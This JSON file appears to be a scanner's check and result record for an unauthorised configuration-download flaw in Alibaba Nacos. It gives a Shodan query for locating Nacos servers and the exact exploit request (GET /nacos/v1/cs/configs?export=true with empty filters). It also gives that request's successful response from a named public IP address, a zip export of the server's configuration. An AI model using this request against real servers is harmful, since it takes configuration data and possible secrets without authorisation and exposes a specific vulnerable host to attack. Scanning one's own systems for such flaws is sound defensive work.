{
    "nacos-info-leak": {
        "info": {
            "name": "Nacos - Information Disclosure",
            "author": "s4e-io",
            "severity": "high",
            "description": "Nacos unauthorized download of configuration information.\n",
            "reference": [
                "https://github.com/wy876/POC/blob/main/Nacos/Nacos%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8B%E8%BD%BD%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF.md"
            ],
            "metadata": {
                "verified": true,
                "max-request": 1,
                "shodan-query": "title:\"Nacos\"",
                "product": "nacos",
                "vendor": "alibaba"
            },
            "tags": "nacos,tech,config,exposure"
        },
        "targets": [
            {
                "target": "http://106.52.93.192:8848",
                "req_resp": [
                    {
                        "req": "GET /nacos/v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId= HTTP/1.1\r\nHOST: 106.52.93.192\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
                        "resp": "HTTP/1.1 200\r\nContent-Disposition: attachment;filename=nacos_config_export_20250321223004.zip\r\nContent-Type: application/octet-stream;charset=UTF-8\r\nContent-Length: 172\r\nDate: Fri, 21 Mar 2025 14:30:03 GMT\r\nKeep-Alive: timeout=60\r\nConnection: keep-alive\r\n\r\nPK\u0003\u0004\u0014\u0000\b\b\b\u0000³uZ\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0017\u0000\u0000\u0000foo/nacos.cfg.dataIdfoo�H���\u000f�/�I\u0001\u0000PK\u0007\b�\u000f*8\f\u0000\u0000\u0000\n\u0000\u0000\u0000PK\u0001\u0002\u0014\u0000\u0014\u0000\b\b\b\u0000³uZ�\u000f*8\f\u0000\u0000\u0000\n\u0000\u0000\u0000\u0017\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000foo/nacos.cfg.dataIdfooPK\u0005\u0006\u0000\u0000\u0000\u0000\u0001\u0000\u0001\u0000E\u0000\u0000\u0000Q\u0000\u0000\u0000\u0000\u0000"
                    },
                    {
                        "req": "GET /v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId= HTTP/1.1\r\nHOST: 106.52.93.192\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
                        "resp": "HTTP/1.1 404\r\nContent-Type: text/html;charset=utf-8\r\nContent-Language: en\r\nContent-Length: 431\r\nDate: Fri, 21 Mar 2025 14:30:03 GMT\r\nKeep-Alive: timeout=60\r\nConnection: keep-alive\r\n\r\n<!doctype html><html lang=\"en\"><head><title>HTTP Status 404 – Not Found</title><style type=\"text/css\">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1></body></html>"
                    }
                ]
            }
        ]
    }
}